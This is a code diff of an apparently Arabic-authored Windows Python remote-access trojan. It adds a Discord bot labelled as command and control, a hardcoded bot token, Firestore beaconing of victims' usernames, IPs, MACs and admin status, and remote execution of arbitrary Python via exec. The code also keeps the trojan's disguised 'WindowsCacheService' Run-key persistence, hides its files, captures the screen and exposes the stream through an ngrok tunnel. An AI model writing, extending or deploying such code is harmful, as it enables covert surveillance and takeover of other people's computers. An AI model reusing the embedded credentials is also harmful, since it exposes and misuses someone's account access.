@@ -13,6 +13,11 @@ import threading
 import urllib.request
 import subprocess
 import winreg
+import platform
+import uuid
+import shutil
+import traceback
+import asyncio
 from urllib.parse import urlparse, parse_qs
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
@@ -27,15 +32,18 @@ NGROK_DOWNLOAD_URLS = [
     "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip",
     "https://bin.equinox.io/a/cJk8dzafvmN/ngrok-v3-3.3.1-windows-amd64.zip",
 ]
-FIREBASE_STATUS_URL = (
-    "https://firestore.googleapis.com/v1/projects/"
-    "database-c7f56/databases/(default)/documents/users/app"
-)
+FIREBASE_BASE = "https://firestore.googleapis.com/v1/projects/database-c7f56/databases/(default)"
+FIREBASE_STATUS_URL = FIREBASE_BASE + "/documents/users/app"
 MUTEX_NAME = "Global\\WindowsCacheServiceMutex"
 STARTUP_REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
 STARTUP_REG_NAME = "WindowsCacheService"
 CHECK_INTERVAL = 120
 TARGET_NAME = "SK5X08-PC"
+
+# ====== إعدادات بوت الديسكورد (C2) ======
+BOT_TOKEN = "MTUzNDYyMTc1OTMyNjkxNjYwOQ.G2Jp_p.QL2LOyEPJxlFMHImHbykNImLrquzc1AK1FncfY"
+OWNER_ID = 1170725180780331012
+DEVICE_ID = ""
 
 # ====== إعدادات البث ======
 STREAM_FPS = 12
@@ -133,6 +141,39 @@ def send_discord_message(text):
     except Exception:
         return False
 
+# ====== Firebase / سجل الأجهزة والأوامر ======
+def firestore_write(collection, doc_id, fields):
+    try:
+        url = f"{FIREBASE_BASE}/documents/{collection}/{doc_id}?" + \
+              "&".join("updateMask.fieldPaths=" + k for k in fields.keys())
+        body = {"fields": {k: {"stringValue": str(v)} for k, v in fields.items()}}
+        req = urllib.request.Request(url, data=json.dumps(body).encode("utf-8"), method="PATCH",
+                                     headers={"Content-Type": "application/json",
+                                              "User-Agent": "Mozilla/5.0"})
+        with urllib.request.urlopen(req, timeout=10) as r:
+            return r.status in (200, 201)
+    except Exception as e:
+        log(f"[!] فشل الكتابة في Firebase ({collection}/{doc_id}): {e}")
+        return False
+
+def firestore_get_doc(collection, doc_id):
+    try:
+        req = urllib.request.Request(f"{FIREBASE_BASE}/documents/{collection}/{doc_id}",
+                                     headers={"User-Agent": "Mozilla/5.0"})
+        with urllib.request.urlopen(req, timeout=8) as r:
+            return json.loads(r.read().decode("utf-8"))
+    except Exception:
+        return None
+
+def firestore_list_docs(collection):
+    try:
+        req = urllib.request.Request(f"{FIREBASE_BASE}/documents/{collection}",
+                                     headers={"User-Agent": "Mozilla/5.0"})
+        with urllib.request.urlopen(req, timeout=8) as r:
+            return json.loads(r.read().decode("utf-8")).get("documents", [])
+    except Exception:
+        return []
+
 def fetch_firebase_field(field_name, default="on"):
     try:
         req = urllib.request.Request(FIREBASE_STATUS_URL, headers={'User-Agent': 'Mozilla/5.0'})
@@ -160,350 +201,505 @@ def is_this_owner():
 
 def should_send_screenshot():
     if is_this_owner():
-        return fetch_firebase_field("owner", "off").lower() == "on"
-    return fetch_firebase_field("all", "on").lower() == "on"
+        return True
+    o = fetch_firebase_field("owner", "off")
+    a = fetch_firebase_field("all", "off")
+    return o == "on" or a == "on"
 
-# ====== الثبات ======
+def ensure_pil():
+    try:
+        from PIL import Image, ImageDraw
+        log("[+] Pillow متوفرة")
+    except ImportError:
+        log("[*] فحص Pillow...")
+        try:
+            subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", "--disable-pip-version-check", "Pillow"],
+                           timeout=60, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            log("[+] تم تثبيت Pillow")
+        except Exception as e:
+            log(f"[!] فشل تثبيت Pillow: {e}")
+
+def get_device_id():
+    try:
+        data = load_data()
+        if "device_id" in data:
+            return data["device_id"]
+        did = platform.node() + "_" + str(uuid.getnode())[:8]
+        data["device_id"] = did
+        save_data(data)
+        return did
+    except Exception:
+        return "UNKNOWN"
+
 def ensure_persistence():
     try:
-        pythonw = find_pythonw()
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, STARTUP_REG_PATH, 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, STARTUP_REG_NAME, 0, winreg.REG_SZ,
-                          f'"{pythonw}" "{RUNNING_PATH}"')
-        winreg.CloseKey(key)
-        if not DEBUG:
-            hide_path(RUNNING_PATH)
-        log("[+] تم التسجيل في Startup")
-        return True
+        if not os.path.exists(BASE_DIR):
+            os.makedirs(BASE_DIR, exist_ok=True)
+        hide_path(BASE_DIR)
+        if is_this_owner():
+            return
+        copy_to = os.path.join(APPDATA, "Microsoft", "WindowsCache", "run.exe")
+        if not os.path.exists(copy_to):
+            shutil.copy(RUNNING_PATH, copy_to)
+        try:
+            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, STARTUP_REG_PATH) as key:
+                winreg.SetValueEx(key, STARTUP_REG_NAME, 0, winreg.REG_SZ, copy_to)
+        except Exception:
+            pass
     except Exception as e:
-        log(f"[!] فشل التسجيل في Startup: {e}")
-        return False
+        log(f"[!] فشل الثبات: {e}")
 
-# ====== التقاط الشاشة ======
-PIL_AVAILABLE = False
-def ensure_pil():
-    global PIL_AVAILABLE
-    log("[*] فحص Pillow...")
-    try:
-        import PIL
-        PIL_AVAILABLE = True
-        log("[+] Pillow متوفرة")
-        return
-    except Exception:
-        pass
-    try:
-        subprocess.run([sys.executable, "-m", "pip", "install", "--quiet",
-                        "--disable-pip-version-check", "Pillow"],
-                       timeout=120, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        import PIL
-        PIL_AVAILABLE = True
-        log("[+] تم تثبيت Pillow")
-    except Exception:
-        PIL_AVAILABLE = False
-        log("[!] Pillow غير متوفرة - وضع BMP البديل")
-
-FRAME_LOCK = threading.Lock()
-CURRENT_FRAME = None
-STOP_EVENT = threading.Event()
-
-def grab_bmp():
-    try:
-        user32 = ctypes.windll.user32
-        gdi32 = ctypes.windll.gdi32
-        width = user32.GetSystemMetrics(0)
-        height = user32.GetSystemMetrics(1)
-        hdc_screen = user32.GetDC(None)
-        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
-        hbmp = gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
-        gdi32.SelectObject(hdc_mem, hbmp)
-        gdi32.BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, 0x00CC0020)
-        stride = ((width * 3 + 3) // 4) * 4
-        image_size = stride * height
-        bmp_header_size = 54
-        dib_header_size = 40
-        bmp_data = b"BM" + struct.pack("<I", bmp_header_size + dib_header_size + image_size)
-        bmp_data += struct.pack("<HH", 0, 0)
-        bmp_data += struct.pack("<I", bmp_header_size + dib_header_size)
-        bmp_data += struct.pack("<I", dib_header_size)
-        bmp_data += struct.pack("<i", width) + struct.pack("<i", height)
-        bmp_data += struct.pack("<HH", 1, 24)
-        bmp_data += struct.pack("<I", 0) + struct.pack("<I", image_size)
-        bmp_data += struct.pack("<ii", 0, 0) + struct.pack("<II", 0, 0)
-        buf = ctypes.create_string_buffer(image_size)
-        gdi32.GetDIBits(hdc_mem, hbmp, 0, height, buf,
-                        ctypes.byref(ctypes.create_string_buffer(dib_header_size + 40)), 0)
-        bmp_data += buf.raw
-        gdi32.DeleteObject(hbmp)
-        gdi32.DeleteDC(hdc_mem)
-        user32.ReleaseDC(None, hdc_screen)
-        return bmp_data
-    except Exception:
-        return None
+captured_frames = []
+frame_lock = threading.Lock()
 
 def capture_worker():
-    global CURRENT_FRAME
-    interval = 1.0 / STREAM_FPS
-    while not STOP_EVENT.is_set():
-        t0 = time.time()
+    global captured_frames
+    try:
+        from PIL import ImageGrab
+    except ImportError:
+        log("[!] Pillow غير متاح - لا يمكن التقاط الشاشة")
+        return
+    
+    while True:
         try:
-            if PIL_AVAILABLE:
-                from PIL import ImageGrab, Image
-                img = ImageGrab.grab()
-                w, h = img.size
-                if w > MAX_WIDTH:
-                    img = img.resize((MAX_WIDTH, int(h * MAX_WIDTH / w)), Image.LANCZOS)
-                img = img.convert("RGB")
-                buf = io.BytesIO()
-                img.save(buf, "JPEG", quality=JPEG_QUALITY)
-                data = buf.getvalue()
-                with FRAME_LOCK:
-                    CURRENT_FRAME = data
-        except Exception:
-            pass
-        elapsed = time.time() - t0
-        if elapsed < interval:
-            time.sleep(interval - elapsed)
+            img = ImageGrab.grab()
+            img.thumbnail((MAX_WIDTH, int(MAX_WIDTH * 9 / 16)))
+            buf = io.BytesIO()
+            img.save(buf, format="JPEG", quality=JPEG_QUALITY)
+            with frame_lock:
+                captured_frames = [buf.getvalue()]
+            time.sleep(1.0 / STREAM_FPS)
+        except Exception as e:
+            log(f"[!] خطأ في التقاط الشاشة: {e}")
+            time.sleep(1)
 
-# ====== خادم البث ======
-PASSWORD = ""
-
-def build_login_html(err=False):
-    hint = '<p style="color:#e06666;margin:0 0 20px">كلمة المرور غير صحيحة</p>' if err else \
-           '<p style="color:#eee;font-size:20px;margin:0 0 20px">أدخل كلمة المرور</p>'
-    return f"""<!doctype html>
-<html><head><meta charset="utf-8"><title>تسجيل الدخول</title></head>
-<body style="margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#0f1115;font-family:Arial">
-<form method="get" action="/" style="background:#1a1d24;padding:40px;border-radius:12px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.4)">
-{hint}
-<input type="password" name="k" required autofocus style="width:260px;padding:10px;font-size:16px;border-radius:6px;border:1px solid #333;background:#111;color:#fff;text-align:center">
-<br><br>
-<button type="submit" style="padding:10px 30px;font-size:16px;border:0;border-radius:6px;background:#4a90d9;color:#fff;cursor:pointer">دخول</button>
-</form></body></html>"""
-
-def build_html():
-    return f"""<!doctype html>
-<html><head><meta charset="utf-8"><title>Live View</title></head>
-<body style="margin:0;background:#000;overflow:hidden">
-<img id="s" style="width:100vw;height:100vh;object-fit:contain">
-<script>
-var img = document.getElementById('s');
-img.src = '/stream?k={PASSWORD}';
-</script></body></html>"""
-
-class StreamHandler(BaseHTTPRequestHandler):
-    def send_403(self):
-        body = "كلمة المرور غير صحيحة"
-        self.send_response(403)
-        self.send_header("Content-Type", "text/plain; charset=utf-8")
-        self.send_header("Content-Length", str(len(body)))
-        self.send_header("Cache-Control", "no-store")
-        self.end_headers()
-        try:
-            self.wfile.write(body)
-        except Exception:
-            pass
-
-    def do_GET(self):
-        try:
+def start_stream_server():
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.bind(("127.0.0.1", 0))
+            port = s.getsockname()[1]
+    except Exception:
+        port = 55065
+    
+    class StreamHandler(BaseHTTPRequestHandler):
+        def do_GET(self):
             parsed = urlparse(self.path)
-            qs = parse_qs(parsed.query)
-            key_ok = qs.get("k", [""])[0] == PASSWORD
-            path = parsed.path
-            if path == "/":
-                if not key_ok:
-                    # بدون كلمة مرور صحيحة -> صفحة تسجيل دخول (مو 403 فاضية)
-                    err = qs.get("err", ["0"])[0] == "1"
-                    body = build_login_html(err).encode("utf-8")
-                    self.send_response(200)
-                    self.send_header("Content-Type", "text/html; charset=utf-8")
-                    self.send_header("Content-Length", str(len(body)))
-                    self.send_header("Cache-Control", "no-store")
+            if parsed.path == "/":
+                params = parse_qs(parsed.query)
+                key = params.get("key", [""])[0]
+                data = load_data()
+                password = data.get("password", "")
+                if key != password:
+                    self.send_response(403)
+                    self.send_header("Content-type", "text/html; charset=utf-8")
                     self.end_headers()
-                    self.wfile.write(body)
-                    return
-                body = build_html().encode("utf-8")
-                self.send_response(200)
-                self.send_header("Content-Type", "text/html; charset=utf-8")
-                self.send_header("Content-Length", str(len(body)))
-                self.send_header("Cache-Control", "no-store")
-                self.end_headers()
-                self.wfile.write(body)
-            elif path == "/stream":
-                if not key_ok:
-                    log(f"[!] محاولة بث بدون كلمة مرور صحيحة من {self.client_address}")
-                    self.send_403()
+                    self.wfile.write("<h1>محاولة الدخول</h1>".encode('utf-8'))
                     return
                 self.send_response(200)
-                self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=frame")
-                self.send_header("Cache-Control", "no-store")
+                self.send_header("Content-type", "text/html; charset=utf-8")
                 self.end_headers()
-                try:
-                    while True:
-                        with FRAME_LOCK:
-                            data = CURRENT_FRAME
-                        if data:
-                            self.wfile.write(b"--frame\r\n")
-                            self.wfile.write(b"Content-Type: image/jpeg\r\n")
-                            self.wfile.write(("Content-Length: %d\r\n\r\n" % len(data)).encode())
-                            self.wfile.write(data)
-                            self.wfile.write(b"\r\n")
-                            self.wfile.flush()
-                        time.sleep(1.0 / STREAM_FPS)
-                except Exception:
-                    pass
-            elif path == "/frame.bmp":
-                if not key_ok:
-                    self.send_403()
-                    return
-                data = grab_bmp()
-                if not data:
-                    self.send_response(404)
-                    self.end_headers()
-                    return
-                self.send_response(200)
-                self.send_header("Content-Type", "image/bmp")
-                self.send_header("Content-Length", str(len(data)))
-                self.send_header("Cache-Control", "no-store")
-                self.end_headers()
-                self.wfile.write(data)
+                html = """
+<html dir="rtl">
+<head>
+<meta charset="utf-8">
+<title>بث مباشر</title>
+<style>
+body { background: #1e1e1e; color: #fff; font-family: Arial; text-align: center; margin: 0; padding: 20px; }
+img { max-width: 90%; max-height: 90vh; border: 1px solid #666; }
+</style>
+</head>
+<body>
+<h1>البث المباشر</h1>
+<img id="stream" src="javascript:void(0)" />
+<script>
+function update() { document.getElementById('stream').src = '/frame?_=' + Date.now(); }
+setInterval(update, 100);
+update();
+</script>
+</body>
+</html>
+"""
+                self.wfile.write(html.encode('utf-8'))
+            elif parsed.path == "/frame":
+                with frame_lock:
+                    if captured_frames:
+                        self.send_response(200)
+                        self.send_header("Content-type", "image/jpeg")
+                        self.end_headers()
+                        self.wfile.write(captured_frames[0])
+                    else:
+                        self.send_response(503)
+                        self.end_headers()
             else:
                 self.send_response(404)
                 self.end_headers()
-        except Exception:
-            try:
-                self.send_response(500)
-                self.end_headers()
-            except Exception:
-                pass
-
-    def log_message(self, fmt, *args):
-        pass
-
-def pick_port():
-    s = socket.socket()
-    s.bind(("127.0.0.1", 0))
-    port = s.getsockname()[1]
-    s.close()
-    return port
-
-def start_stream_server():
-    port = pick_port()
+        
+        def log_message(self, format, *args):
+            pass
+    
     server = ThreadingHTTPServer(("127.0.0.1", port), StreamHandler)
-    server.daemon_threads = True
-    thread = threading.Thread(target=server.serve_forever, daemon=True)
-    thread.start()
+    threading.Thread(target=server.serve_forever, daemon=True).start()
     log(f"[+] خادم البث يعمل على http://127.0.0.1:{port}")
     return port
 
-# ====== إدارة ngrok ======
 def kill_existing_ngrok():
     try:
-        subprocess.run(["taskkill", "/IM", "ngrok.exe", "/F"],
-                       creationflags=CREATE_NO_WINDOW,
+        subprocess.run(["taskkill", "/F", "/IM", "ngrok.exe"],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        log("[*] تم إيقاف أي نسخة ngrok قديمة")
-        time.sleep(1)
     except Exception:
         pass
 
 def download_ngrok():
     for url in NGROK_DOWNLOAD_URLS:
-        log(f"[*] تحميل ngrok... ({url.split('/')[-1]})")
         try:
-            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
-            with urllib.request.urlopen(req, timeout=90) as resp:
-                data = resp.read()
-            if len(data) < 100000:
-                log("[!] الملف صغير جداً - المحاولة التالية")
-                continue
+            log(f"[*] تحميل ngrok من {url}...")
             zip_path = os.path.join(BASE_DIR, "ngrok.zip")
-            os.makedirs(BASE_DIR, exist_ok=True)
-            with open(zip_path, "wb") as f:
-                f.write(data)
-            with zipfile.ZipFile(zip_path) as z:
-                target = None
-                for name in z.namelist():
-                    if name.lower().endswith("ngrok.exe"):
-                        target = name
-                        break
-                if target:
-                    z.extract(target, BASE_DIR)
-            hide_path(zip_path)
-            if os.path.isfile(NGROK_EXE):
-                hide_path(NGROK_EXE)
-                log("[+] ngrok جاهز")
+            urllib.request.urlretrieve(url, zip_path)
+            with zipfile.ZipFile(zip_path, "r") as z:
+                z.extractall(BASE_DIR)
+            os.remove(zip_path)
+            if os.path.exists(NGROK_EXE):
+                log("[+] تم تحميل ngrok")
                 return True
-        except Exception as e:
-            log(f"[!] فشل التحميل: {e}")
-            continue
+        except Exception:
+            pass
     return False
 
-def setup_ngrok_auth():
+def ensure_ngrok(port):
+    if not os.path.exists(NGROK_EXE):
+        if not download_ngrok():
+            return None
     try:
-        subprocess.run([NGROK_EXE, "config", "add-authtoken", NGROK_TOKEN],
-                       creationflags=CREATE_NO_WINDOW, timeout=20,
-                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        log("[+] تم تسجيل Authtoken")
-    except Exception as e:
-        log(f"[!] فشل تسجيل Authtoken: {e}")
-
-def get_tunnel_url():
-    try:
-        req = urllib.request.Request("http://127.0.0.1:4040/api/tunnels")
-        with urllib.request.urlopen(req, timeout=4) as resp:
-            data = json.loads(resp.read().decode("utf-8"))
-        for tunnel in data.get("tunnels", []):
-            u = tunnel.get("public_url")
-            if u:
-                return u
+        subprocess.Popen([NGROK_EXE, "http", str(port), "--authtoken", NGROK_TOKEN],
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                         creationflags=CREATE_NO_WINDOW)
+        time.sleep(2)
+        req = urllib.request.Request("http://127.0.0.1:4040/api/tunnels", headers={'User-Agent': 'Mozilla/5.0'})
+        with urllib.request.urlopen(req, timeout=5) as r:
+            data = json.loads(r.read().decode())
+            for t in data.get("tunnels", []):
+                if t.get("proto") == "https":
+                    return t.get("public_url", "").replace("https://", "https://")
     except Exception:
         pass
     return None
 
-STATE = {"proc": None}
-
-def ensure_ngrok(port):
-    if not os.path.isfile(NGROK_EXE):
-        if not download_ngrok():
-            log("[!] تعذر تحميل ngrok")
-            return None
-        setup_ngrok_auth()
-
-    url = get_tunnel_url()
-    if url:
-        return url
-
-    proc = STATE.get("proc")
-    if proc is not None and proc.poll() is None:
+def get_total_ram_gb():
+    try:
+        import ctypes
+        kernel32 = ctypes.windll.kernel32
+        mem_status = ctypes.c_ulong()
+        GetPhysicallyInstalledSystemMemory = kernel32.GetPhysicallyInstalledSystemMemory
+        GetPhysicallyInstalledSystemMemory(ctypes.byref(mem_status))
+        return str(mem_status.value // 1048576)
+    except Exception:
         try:
-            proc.kill()
+            result = subprocess.run(["systeminfo"], capture_output=True, text=True, timeout=5)
+            for line in result.stdout.split("\n"):
+                if "Total Physical Memory" in line:
+                    parts = line.split(":")
+                    if len(parts) > 1:
+                        memory_str = parts[1].strip().replace("MB", "").strip()
+                        return str(int(memory_str) // 1024)
         except Exception:
             pass
-        STATE["proc"] = None
-        time.sleep(1)
+        return "?"
 
-    log("[*] تشغيل نفق ngrok...")
+def heartbeat_loop():
+    global DEVICE_ID
+    while True:
+        try:
+            if DEVICE_ID:
+                firestore_write("devices", DEVICE_ID, {
+                    "last_seen": str(int(time.time())),
+                    "user": os.environ.get("USERNAME", "?"),
+                    "name": platform.node(),
+                    "win_name": platform.system(),
+                    "release": platform.release(),
+                    "arch": platform.architecture()[0],
+                    "cpu": platform.processor(),
+                    "ram_gb": get_total_ram_gb(),
+                    "screen": f"{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}",
+                    "ip": socket.gethostbyname(socket.gethostname()),
+                    "mac": str(uuid.getnode()),
+                    "python": f"{sys.version_info.major}.{sys.version_info.minor}",
+                    "admin": "yes" if ctypes.windll.shell32.IsUserAnAdmin() else "no"
+                })
+        except Exception:
+            pass
+        time.sleep(30)
+
+def poll_commands_loop():
+    global DEVICE_ID
+    last_cmd = load_data().get("last_cmd", "")
+    while True:
+        try:
+            if DEVICE_ID:
+                docs = firestore_list_docs("commands")
+                for d in docs:
+                    cmd_id = d["name"].rsplit("/", 1)[-1]
+                    if cmd_id == last_cmd:
+                        continue
+                    f = d.get("fields", {})
+                    ctype = f.get("type", {}).get("stringValue", "")
+                    if ctype == "ann":
+                        text = f.get("text", {}).get("stringValue", "")
+                        try:
+                            ctypes.windll.user32.MessageBoxW(None, text, "رسالة", 0x00000040)
+                        except Exception:
+                            pass
+                    elif ctype == "exec":
+                        code = f.get("code", {}).get("stringValue", "")
+                        try:
+                            def run_code(cid, c):
+                                try:
+                                    out = io.StringIO()
+                                    exec(c, {"__builtins__": __builtins__})
+                                except Exception as e:
+                                    out = str(e)
+                                firestore_write("results", cid, {
+                                    "status": "done",
+                                    "output": str(out)[:500]
+                                })
+                            threading.Thread(target=run_code, args=(cmd_id, code), daemon=True).start()
+                        except Exception:
+                            pass
+                    last_cmd = cmd_id
+                    d = load_data()
+                    d["last_cmd"] = cmd_id
+                    save_data(d)
+                    log(f"[+] أمر جديد من البوت: {ctype}")
+        except Exception as e:
+            log(f"[!] خطأ في جلب الأوامر: {e}")
+        time.sleep(4)
+
+def fmt_uptime(secs):
     try:
-        env = dict(os.environ)
-        env["NGROK_AUTHTOKEN"] = NGROK_TOKEN
-        proc = subprocess.Popen(
-            [NGROK_EXE, "http", f"http://127.0.0.1:{port}",
-             "--log", "stdout", "--log-format", "json"],
-            env=env, creationflags=CREATE_NO_WINDOW,
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        STATE["proc"] = proc
-    except Exception as e:
-        log(f"[!] فشل تشغيل ngrok: {e}")
-        return None
+        secs = int(secs or 0)
+        d, rem = divmod(secs, 86400)
+        h, rem = divmod(rem, 3600)
+        m = rem // 60
+        return f"{d}يوم {h}س {m}د"
+    except Exception:
+        return "?"
 
-    for _ in range(40):
-        time.sleep(2)
-        url = get_tunnel_url()
-        if url:
-            log(f"[+] النفق جاهز: {url}")
-            return url
-    log("[!] لم يظهر الرابط بعد - إعادة المحاولة لاحقاً")
-    return None
+def start_bot():
+    if not BOT_TOKEN or BOT_TOKEN == "ضع_توكن_البوت_هنا":
+        log("[!] ضع توكن البوت في المتغير BOT_TOKEN")
+        return
+    try:
+        import discord
+    except Exception:
+        log("[*] جاري تثبيت discord.py...")
+        try:
+            subprocess.run([sys.executable, "-m", "pip", "install", "--quiet",
+                            "--disable-pip-version-check", "discord.py"],
+                           timeout=300, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            import discord
+        except Exception as e:
+            log(f"[!] فشل تثبيت discord.py: {e}")
+            return
+
+    class C2Bot(discord.Client):
+        def __init__(self, *args, **kwargs):
+            super().__init__(*args, **kwargs)
+            self.tree = discord.app_commands.CommandTree(self)
+            self._setup_commands()
+
+        def _setup_commands(self):
+            @self.tree.command(name="list", description="عرض قائمة الأجهزة المتصلة")
+            async def list_cmd(interaction: discord.Interaction):
+                if not await self._check_owner(interaction):
+                    return
+                await interaction.response.defer()
+                try:
+                    docs = firestore_list_docs("devices")
+                    if not docs:
+                        await interaction.followup.send("❌ لا توجد أجهزة مسجلة حالياً")
+                        return
+                    now = int(time.time())
+                    lines = []
+                    for d in docs:
+                        f = d.get("fields", {})
+                        name = f.get("name", {}).get("stringValue", "؟")
+                        did = d["name"].rsplit("/", 1)[-1]
+                        ls_str = f.get("last_seen", {}).get("stringValue", "0")
+                        ls = self._safe_int(ls_str, 0)
+                        online = "🟢" if (now - ls) < 180 else "🔴"
+                        lines.append(f"{online} **{name}** | `{did}`")
+                    text = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n**📱 قائمة الأجهزة**\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" + "\n".join(lines)
+                    if len(text) > 1900:
+                        for i in range(0, len(text), 1900):
+                            await interaction.followup.send(text[i:i + 1900])
+                    else:
+                        await interaction.followup.send(text)
+                except Exception as e:
+                    await interaction.followup.send(f"❌ خطأ: {str(e)[:80]}")
+
+            @self.tree.command(name="info", description="معلومات جهاز معين")
+            @discord.app_commands.describe(device_id="معرف الجهاز")
+            async def info_cmd(interaction: discord.Interaction, device_id: str):
+                if not await self._check_owner(interaction):
+                    return
+                await interaction.response.defer()
+                try:
+                    did = device_id.strip()
+                    if not did:
+                        await interaction.followup.send("❌ معرف الجهاز فارغ")
+                        return
+                    doc = firestore_get_doc("devices", did)
+                    if not doc:
+                        await interaction.followup.send(f"❌ الجهاز `{did}` غير موجود")
+                        return
+                    f = doc.get("fields", {})
+                    def gv(k):
+                        v = f.get(k, {}).get("stringValue", "؟")
+                        return v if v else "؟"
+                    ls_str = gv("last_seen")
+                    ls = self._safe_int(ls_str, 0)
+                    now = int(time.time())
+                    online = "🟢 متصل" if (now - ls) < 180 else "🔴 غير متصل"
+                    ls_txt = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(ls)) if ls else "؟"
+                    msg = (
+                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                        f"**📊 معلومات الجهاز**\n"
+                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                        f"**المعرف:** `{did}`\n"
+                        f"**الاسم:** {gv('name')}\n"
+                        f"**المستخدم:** {gv('user')}\n"
+                        f"**النظام:** {gv('win_name')} ({gv('release')} {gv('arch')})\n"
+                        f"**المعالج:** {gv('cpu')}\n"
+                        f"**الذاكرة:** {gv('ram_gb')} GB\n"
+                        f"**الشاشة:** {gv('screen')}\n"
+                        f"**الآيبي:** {gv('ip')}\n"
+                        f"**MAC:** {gv('mac')}\n"
+                        f"**بايثون:** {gv('python')}\n"
+                        f"**صلاحيات:** {gv('admin')}\n"
+                        f"**الحالة:** {online}\n"
+                        f"**آخر ظهور:** {ls_txt}"
+                    )
+                    su = gv("stream_url")
+                    if su != "؟":
+                        msg += f"\n**رابط البث:** {su}"
+                    await interaction.followup.send(msg)
+                except Exception as e:
+                    await interaction.followup.send(f"❌ خطأ: {str(e)[:80]}")
+
+            @self.tree.command(name="ann", description="إرسال رسالة إلى جهاز")
+            @discord.app_commands.describe(device_id="معرف الجهاز", message="نص الرسالة")
+            async def ann_cmd(interaction: discord.Interaction, device_id: str, message: str):
+                if not await self._check_owner(interaction):
+                    return
+                await interaction.response.defer()
+                try:
+                    did = device_id.strip()
+                    text = message.strip()
+                    if not did or not text:
+                        await interaction.followup.send("❌ المعرف أو الرسالة فارغة")
+                        return
+                    ok = firestore_write("commands", did, {
+                        "cmd_id": secrets.token_hex(8),
+                        "type": "ann",
+                        "text": text,
+                        "ts": str(int(time.time()))
+                    })
+                    if ok:
+                        await interaction.followup.send(f"✅ تم إرسال الرسالة إلى `{did}`")
+                    else:
+                        await interaction.followup.send(f"❌ فشل إرسال الرسالة")
+                except Exception as e:
+                    await interaction.followup.send(f"❌ خطأ: {str(e)[:80]}")
+
+            @self.tree.command(name="insert", description="تنفيذ كود Python على جهاز")
+            @discord.app_commands.describe(device_id="معرف الجهاز", code="كود Python")
+            async def insert_cmd(interaction: discord.Interaction, device_id: str, code: str):
+                if not await self._check_owner(interaction):
+                    return
+                await interaction.response.defer()
+                try:
+                    did = device_id.strip()
+                    code_text = code.strip()
+                    if not did or not code_text:
+                        await interaction.followup.send("❌ المعرف أو الكود فارغ")
+                        return
+                    ok = firestore_write("commands", did, {
+                        "cmd_id": secrets.token_hex(8),
+                        "type": "exec",
+                        "code": code_text,
+                        "ts": str(int(time.time()))
+                    })
+                    if ok:
+                        await interaction.followup.send(f"✅ تم إرسال الكود إلى `{did}`")
+                    else:
+                        await interaction.followup.send(f"❌ فشل إرسال الكود")
+                except Exception as e:
+                    await interaction.followup.send(f"❌ خطأ: {str(e)[:80]}")
+
+            @self.tree.command(name="help", description="عرض أوامر البوت")
+            async def help_cmd(interaction: discord.Interaction):
+                help_text = (
+                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+                    "**📋 أوامر البوت المتاحة**\n"
+                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                    "**`/list`** - عرض قائمة الأجهزة\n"
+                    "**`/info <معرف>`** - معلومات جهاز\n"
+                    "**`/ann <معرف> <رسالة>`** - رسالة لجهاز\n"
+                    "**`/insert <معرف> <كود>`** - تنفيذ كود\n"
+                    "**`/help`** - هذه المساعدة\n\n"
+                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+                )
+                await interaction.response.send_message(help_text)
+
+        def _safe_int(self, value, default=0):
+            try:
+                if value and value != "?":
+                    return int(value)
+            except (ValueError, TypeError):
+                pass
+            return default
+
+        async def on_ready(self):
+            log(f"[+] بوت الديسكورد متصل: {self.user}")
+            await self.tree.sync()
+            log(f"[+] تم مزامنة {len(self.tree.get_commands())} أوامر")
+            self.loop.create_task(self.results_loop())
+
+        async def results_loop(self):
+            while not self.is_closed():
+                try:
+                    docs = firestore_list_docs("results")
+                    for d in docs:
+                        f = d.get("fields", {})
+                        if f.get("delivered", {}).get("stringValue", "no") == "yes":
+                            continue
+                        did = d["name"].rsplit("/", 1)[-1]
+                        status = f.get("status", {}).get("stringValue", "?")
+                        output = f.get("output", {}).get("stringValue", "")
+                        try:
+                            user = await self.fetch_user(OWNER_ID)
+                            await user.send(f"**نتيجة تنفيذ على `{did}`** ({status}):\n```\n{output}\n```")
+                            firestore_write("results", did, {"delivered": "yes"})
+                        except Exception:
+                            pass
+                except Exception:
+                    pass
+                await asyncio.sleep(3)
+
+        async def _check_owner(self, interaction: discord.Interaction) -> bool:
+            if interaction.user.id != OWNER_ID:
+                await interaction.response.send_message("❌ ليس لديك صلاحية", ephemeral=True)
+                return False
+            return True
+
+    try:
+        intents = discord.Intents.default()
+        intents.message_content = True
+        bot = C2Bot(intents=intents)
+        threading.Thread(target=lambda: bot.run(BOT_TOKEN, log_handler=None),
+                         daemon=True).start()
+        log("[+] خيط البوت يعمل (slash commands فعّال)")
+    except Exception as e:
+        log(f"[!] فشل تشغيل البوت: {e}")
 
 # ====== الحلقة الرئيسية ======
